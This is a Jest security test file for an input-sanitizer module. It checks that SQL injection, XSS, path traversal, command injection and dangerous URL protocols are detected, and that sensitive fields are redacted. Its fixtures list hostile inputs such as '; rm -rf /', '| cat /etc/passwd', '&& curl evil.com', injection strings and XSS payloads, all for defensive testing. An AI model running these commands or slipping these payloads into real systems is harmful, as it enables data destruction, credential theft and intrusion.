/**
 * Security Tests for Input Sanitization
 *
 * Tests all security validation and sanitization functions
 * to ensure protection against common vulnerabilities.
 */

import { describe, it, expect } from '@jest/globals';
import { InputSanitizer } from '../../src/security/input-sanitizer';

describe('InputSanitizer - Security Tests', () => {
  describe('SQL Injection Prevention', () => {
    it('should detect SQL injection patterns', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords--",
        "1; DELETE FROM users WHERE 1=1",
      ];

      for (const input of maliciousInputs) {
        const result = InputSanitizer.validateSQLParameter(input);
        expect(result.warnings.length).toBeGreaterThan(0);
        expect(result.warnings[0]).toContain('SQL-like patterns');
      }
    });

    it('should allow safe SQL parameters', () => {
      const safeInputs = [
        'john_doe',
        'user@example.com',
        '12345',
        null,
        undefined,
        42,
        true,
        false
      ];

      for (const input of safeInputs) {
        const result = InputSanitizer.validateSQLParameter(input);
        expect(result.valid).toBe(true);
        expect(result.errors.length).toBe(0);
      }
    });

    it('should handle objects by JSON stringifying', () => {
      const obj = { name: 'test', value: 123 };
      const result = InputSanitizer.validateSQLParameter(obj);

      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe(JSON.stringify(obj));
    });
  });

  describe('XSS Prevention', () => {
    it('should detect XSS attacks', () => {
      const xssInputs = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<object data="javascript:alert(\'XSS\')">',
      ];

      for (const input of xssInputs) {
        const result = InputSanitizer.sanitizeString(input, { allowHtml: false });
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.includes('XSS'))).toBe(true);
      }
    });

    it('should sanitize HTML by stripping tags', () => {
      const html = '<p>Hello <script>alert("xss")</script> world</p>';
      const sanitized = InputSanitizer.sanitizeHTML(html);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('<p>');
      expect(sanitized).toContain('Hello');
      expect(sanitized).toContain('world');
    });

    it('should escape HTML entities', () => {
      const input = '<div>Test & "quotes" \'apostrophes\'</div>';
      const sanitized = InputSanitizer.sanitizeHTML(input);

      // HTML tags are stripped first, then remaining text is escaped
      expect(sanitized).not.toContain('<div>');
      expect(sanitized).toContain('&amp;');  // & is escaped
      expect(sanitized).toContain('&quot;');  // quotes are escaped
      expect(sanitized).toContain('&#x27;');  // apostrophes are escaped
      expect(sanitized).toContain('Test');  // Content is preserved
    });

    it('should allow whitelisted HTML tags', () => {
      const input = '<p>Hello <b>world</b> <script>alert("xss")</script></p>';
      const sanitized = InputSanitizer.sanitizeHTML(input, ['p', 'b']);

      // Should still escape everything for safety in this implementation
      expect(sanitized).not.toContain('<script>');
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should block path traversal attempts', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'uploads/../../config.json',
        './../../secrets.txt'
      ];

      for (const maliciousPath of maliciousPaths) {
        const result = InputSanitizer.validatePath(maliciousPath, {
          allowTraversal: false
        });
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.includes('traversal'))).toBe(true);
      }
    });

    it('should allow safe relative paths', () => {
      const safePaths = [
        'uploads/image.jpg',
        'docs/readme.md',
        'src/index.ts'
      ];

      for (const safePath of safePaths) {
        const result = InputSanitizer.validatePath(safePath, {
          allowTraversal: false,
          allowAbsolute: false
        });
        expect(result.valid).toBe(true);
      }
    });

    it('should enforce base directory constraints', () => {
      const baseDir = '/var/app/uploads';

      // Should allow path within base dir
      const validPath = 'user1/photo.jpg';
      const result1 = InputSanitizer.validatePath(validPath, {
        baseDirectory: baseDir
      });
      expect(result1.valid).toBe(true);
      expect(result1.sanitized).toContain(baseDir);

      // Should block path escaping base dir
      const escapePath = '../../../etc/passwd';
      const result2 = InputSanitizer.validatePath(escapePath, {
        baseDirectory: baseDir,
        allowTraversal: true  // Even with traversal allowed, base dir is enforced
      });
      expect(result2.valid).toBe(false);
    });

    it('should validate file extensions', () => {
      const allowedExtensions = ['.jpg', '.png', '.gif'];

      // Valid extension
      const validFile = 'photo.jpg';
      const result1 = InputSanitizer.validatePath(validFile, {
        allowedExtensions
      });
      expect(result1.valid).toBe(true);

      // Invalid extension
      const invalidFile = 'malware.exe';
      const result2 = InputSanitizer.validatePath(invalidFile, {
        allowedExtensions
      });
      expect(result2.valid).toBe(false);
      expect(result2.errors.some(e => e.includes('extension'))).toBe(true);
    });

    it('should block absolute paths when not allowed', () => {
      const absolutePaths = [
        '/etc/passwd'
      ];

      // Test Unix absolute path
      for (const absPath of absolutePaths) {
        const result = InputSanitizer.validatePath(absPath, {
          allowAbsolute: false
        });
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.includes('Absolute'))).toBe(true);
      }

      // Windows paths are only absolute on Windows platform
      if (process.platform === 'win32') {
        const winPath = 'C:\\Windows\\System32\\config.sys';
        const result = InputSanitizer.validatePath(winPath, {
          allowAbsolute: false
        });
        expect(result.valid).toBe(false);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should detect command injection attempts', () => {
      const maliciousArgs = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '$(whoami)',
        '`id`',
        '${USER}',
        '&& curl evil.com'
      ];

      for (const arg of maliciousArgs) {
        const result = InputSanitizer.validateCommand('ls', [arg], {
          allowedCommands: ['ls']
        });
        expect(result.valid).toBe(false);
        expect(result.errors.some(e => e.includes('dangerous pattern'))).toBe(true);
      }
    });

    it('should allow safe commands', () => {
      const result = InputSanitizer.validateCommand('git', ['status'], {
        allowedCommands: ['git', 'npm', 'node']
      });
      expect(result.valid).toBe(true);
    });

    it('should enforce command whitelist', () => {
      const result = InputSanitizer.validateCommand('rm', ['-rf', '/'], {
        allowedCommands: ['git', 'npm']
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('not allowed'))).toBe(true);
    });

    it('should validate flags whitelist', () => {
      const result = InputSanitizer.validateCommand('git', ['--dangerous-flag'], {
        allowedCommands: ['git'],
        allowedFlags: ['--branch', '--remote']
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('Flag'))).toBe(true);
    });

    it('should enforce command length limits', () => {
      const longArgs = Array(1000).fill('a').join(' ');
      const result = InputSanitizer.validateCommand('echo', [longArgs], {
        maxLength: 100
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('maximum length'))).toBe(true);
    });
  });

  describe('Sensitive Data Sanitization', () => {
    it('should redact sensitive keys', () => {
      const data = {
        username: 'john',
        password: 'secret123',
        api_key: 'abc123',
        normal_field: 'visible'
      };

      const sanitized = InputSanitizer.sanitizeSensitiveData(data);

      expect(sanitized.username).toBe('john');
      expect(sanitized.password).toBe('[REDACTED]');
      expect(sanitized.api_key).toBe('[REDACTED]');
      expect(sanitized.normal_field).toBe('visible');
    });

    it('should handle nested objects', () => {
      const data = {
        user: {
          name: 'john',
          settings: {
            password: 'secret',
            token: 'xyz789',
            theme: 'dark'
          }
        }
      };

      const sanitized = InputSanitizer.sanitizeSensitiveData(data);

      expect(sanitized.user.name).toBe('john');
      expect(sanitized.user.settings.password).toBe('[REDACTED]');
      expect(sanitized.user.settings.token).toBe('[REDACTED]');
      expect(sanitized.user.settings.theme).toBe('dark');  // Non-sensitive field preserved
    });

    it('should handle arrays', () => {
      const data = [
        { name: 'user1', password: 'pass1' },
        { name: 'user2', password: 'pass2' }
      ];

      const sanitized = InputSanitizer.sanitizeSensitiveData(data);

      expect(sanitized[0].name).toBe('user1');
      expect(sanitized[0].password).toBe('[REDACTED]');
      expect(sanitized[1].name).toBe('user2');
      expect(sanitized[1].password).toBe('[REDACTED]');
    });
  });

  describe('String Sanitization', () => {
    it('should enforce max length', () => {
      const longString = 'a'.repeat(1000);
      const result = InputSanitizer.sanitizeString(longString, {
        maxLength: 100
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('maximum length'))).toBe(true);
    });

    it('should validate allowed characters', () => {
      const result = InputSanitizer.sanitizeString('hello123!', {
        allowedCharacters: /^[a-z0-9]+$/
      });
      expect(result.valid).toBe(false);
    });

    it('should trim whitespace by default', () => {
      const result = InputSanitizer.sanitizeString('  hello world  ');
      expect(result.sanitized).toBe('hello world');
    });

    it('should reject non-string input', () => {
      const result = InputSanitizer.sanitizeString(123 as any);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('must be a string'))).toBe(true);
    });
  });

  describe('Email Validation', () => {
    it('should validate correct emails', () => {
      const validEmails = [
        'user@example.com',
        'test.user@domain.co.uk',
        'admin+tag@company.org'
      ];

      for (const email of validEmails) {
        const result = InputSanitizer.validateEmail(email);
        expect(result.valid).toBe(true);
      }
    });

    it('should reject invalid emails', () => {
      const invalidEmails = [
        'notanemail',
        '@example.com',
        'user@',
        'user @example.com',
        'user@example'
      ];

      for (const email of invalidEmails) {
        const result = InputSanitizer.validateEmail(email);
        expect(result.valid).toBe(false);
      }
    });

    it('should normalize email to lowercase', () => {
      const result = InputSanitizer.validateEmail('USER@EXAMPLE.COM');
      expect(result.sanitized).toBe('user@example.com');
    });
  });

  describe('URL Validation', () => {
    it('should validate safe URLs', () => {
      const validUrls = [
        'https://example.com',
        'http://localhost:3000',
        'https://api.example.com/v1/users'
      ];

      for (const url of validUrls) {
        const result = InputSanitizer.validateURL(url);
        expect(result.valid).toBe(true);
      }
    });

    it('should reject dangerous protocols', () => {
      const dangerousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd'
      ];

      for (const url of dangerousUrls) {
        const result = InputSanitizer.validateURL(url);
        expect(result.valid).toBe(false);
      }
    });

    it('should enforce protocol whitelist', () => {
      const result = InputSanitizer.validateURL('ftp://files.example.com', ['http', 'https']);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('Protocol'))).toBe(true);
    });
  });

  describe('Hash Generation', () => {
    it('should generate consistent hashes', () => {
      const input = 'test string';
      const hash1 = InputSanitizer.hashInput(input);
      const hash2 = InputSanitizer.hashInput(input);

      expect(hash1).toBe(hash2);
      expect(hash1.length).toBe(64); // SHA-256 produces 64 hex characters
    });

    it('should generate different hashes for different inputs', () => {
      const hash1 = InputSanitizer.hashInput('input1');
      const hash2 = InputSanitizer.hashInput('input2');

      expect(hash1).not.toBe(hash2);
    });
  });
});
